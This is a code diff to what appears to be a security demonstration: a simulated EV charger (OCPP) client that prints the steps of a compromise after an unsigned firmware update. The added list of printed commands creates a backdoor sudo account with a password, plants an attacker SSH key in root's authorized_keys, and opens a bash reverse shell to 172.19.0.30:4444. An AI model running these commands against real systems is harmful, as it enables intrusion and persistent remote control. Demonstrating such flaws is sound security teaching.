@@ -159,10 +159,36 @@ class EVSE(cp):
 
         await self._send_firmware_status(FirmwareStatus.installing)
         print(f"[EVSE] Installing firmware (executing payload as root) ...")
-        await asyncio.sleep(3)
+        await asyncio.sleep(1)
+
+        # Simulate payload execution output — what a real compromised EVSE would show
+        exec_steps = [
+            ("useradd -m -s /bin/bash backdoor",              None),
+            ("echo 'backdoor:EV$ecr3t!' | chpasswd",         None),
+            ("usermod -aG sudo backdoor",                     None),
+            ("mkdir -p /root/.ssh && chmod 700 /root/.ssh",   None),
+            ("echo '<attacker_pubkey>' >> /root/.ssh/authorized_keys", None),
+            ("nohup bash -i >& /dev/tcp/172.19.0.30/4444 0>&1 &", None),
+            ("id backdoor", "uid=1001(backdoor) gid=1001(backdoor) groups=1001(backdoor),27(sudo)"),
+        ]
+        print()
+        for cmd, output in exec_steps:
+            print(f"[EVSE] \033[93m$ {cmd}\033[0m")
+            if output:
+                print(f"[EVSE]   {output}")
+            await asyncio.sleep(0.4)
+
+        print()
+        print(f"[EVSE] \033[91m\033[1m{'!'*52}\033[0m")
+        print(f"[EVSE] \033[91m\033[1m  EVSE FULLY COMPROMISED\033[0m")
+        print(f"[EVSE] \033[91m\033[1m  Backdoor account : backdoor / EV$ecr3t! (sudo)\033[0m")
+        print(f"[EVSE] \033[91m\033[1m  SSH key          : implanted in /root/.ssh/authorized_keys\033[0m")
+        print(f"[EVSE] \033[91m\033[1m  Reverse shell    : active on 172.19.0.30:4444\033[0m")
+        print(f"[EVSE] \033[91m\033[1m  Root cause       : UpdateFirmware had no signature — EVSE trusted any URL\033[0m")
+        print(f"[EVSE] \033[91m\033[1m{'!'*52}\033[0m")
+        print()
 
         await self._send_firmware_status(FirmwareStatus.installed)
-        print(f"[EVSE] Firmware install complete — EVSE now compromised")
 
     async def _send_firmware_status(self, status: FirmwareStatus):
         try:
@@ -190,6 +216,9 @@ async def ocpp_sender(queue, evse):
 
         try:
             await evse.send_meter(charger_id, p_kw)
+        except websockets.exceptions.ConnectionClosed:
+            print("[CLIENT] Server closed connection — exiting")
+            raise
         except Exception as exc:
             # Connection may be briefly disrupted during MITM attack.
             print(f"[CLIENT] send_meter error: {exc}")
